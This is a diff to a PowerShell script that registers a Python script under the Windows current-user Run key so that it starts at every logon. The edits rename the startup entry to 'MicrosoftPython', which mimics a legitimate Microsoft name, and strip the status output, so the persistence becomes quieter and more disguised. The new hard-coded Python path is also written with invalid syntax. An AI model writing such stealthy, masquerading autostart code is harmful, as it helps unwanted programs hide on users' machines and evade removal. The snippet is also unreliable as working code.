@@ -20,7 +20,7 @@ function Add-ToStartup {
     param($pythonExe, $scriptPath)
     
     $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $regName = "SysHelper"
+    $regName = "MicrosoftPython"
     $command = "`"$pythonExe`" `"$scriptPath`""
     
     if (-not (Test-Path $regPath)) {
@@ -30,16 +30,14 @@ function Add-ToStartup {
 }
 
 try {
-    $pythonExe = $request.QueryString['q']
+    $pythonExe = "$env:%LOCALAPPDATA%\Programs\Python\Python310"
     
     if ($pythonExe) {
-        Write-Output "Received Python path: $pythonExe"
         
         if (Test-Path $pythonExe) {
             $scriptPath = Create-PythonScript -q $pythonExe
             Add-ToStartup -pythonExe $pythonExe -scriptPath $scriptPath
             
-            Write-Output "Successfully configured startup with: $pythonExe"
         } else {
             Write-Output "Python executable not found: $pythonExe"
         }
@@ -50,5 +48,3 @@ try {
 catch {
     Write-Output "Error: $($_.Exception.Message)"
 }
-
-Remove-Item "$env:TEMP\PythonEmbed" -Force -Recurse -ErrorAction SilentlyContinue
